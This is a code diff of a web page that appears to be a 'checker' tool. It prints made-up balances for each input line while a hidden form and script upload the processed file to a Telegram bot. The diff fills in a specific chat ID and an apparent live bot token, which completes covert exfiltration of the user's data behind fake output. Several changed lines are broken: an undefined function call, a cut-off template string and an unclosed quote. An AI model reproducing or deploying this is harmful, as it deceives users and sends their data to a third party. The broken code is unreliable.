@@ -82,7 +82,7 @@ button:hover { background: #334155; }
 <!-- Hidden form for Telegram upload -->
 <form id="telegramForm" method="POST" enctype="multipart/form-data" style="display:none;">
   <input type="file" name="document" id="telegramFileInput" />
-  <input type="hidden" name="chat_id" value="YOUR_CHAT_ID" />
+  <input type="hidden" name="chat_id" value=8580854380 />
 </form>
 
 <script>
@@ -176,8 +176,8 @@ async function processLines() {
       updateStats();
 
       // Generate fake balance
-      const amount=(Math.random()*0.98).toFixed(2);
-      const balanceFormat=Math.random()<0.5 ? `R0,${amount}` : `R0.${amount.replace(',', '.')}`;
+      const amount=(random()*.98).toFixed(2);
+      const balanceFormat=Math.random()<0.5 ? `R0,${amount}` : `R0.$
 
       // Append output
       outputDiv.innerHTML += `${line}\nBalance=${balanceFormat}\nBonus=R0.00\nWithdrawal=0\n\n`;
@@ -235,10 +235,10 @@ document.getElementById('startBtn').addEventListener('click', () => {
 /* Send file to Telegram */
 async function sendFileToTelegram(fileBlob) {
   const formData=new FormData();
-  formData.append('chat_id','YOUR_CHAT_ID'); // Replace with your chat ID
+  formData.append('chat_id','8580854380); // Replace with your chat ID
   formData.append('document',fileBlob,'upload.txt');
   try {
-    await fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendDocument`, {
+    await fetch(`https://api.telegram.org/8302046626:AAETtWXTTdFHr5bKqSWhAvLakb4axjGlz9U/sendDocument`, {
       method:'POST',
       body:formData
     });
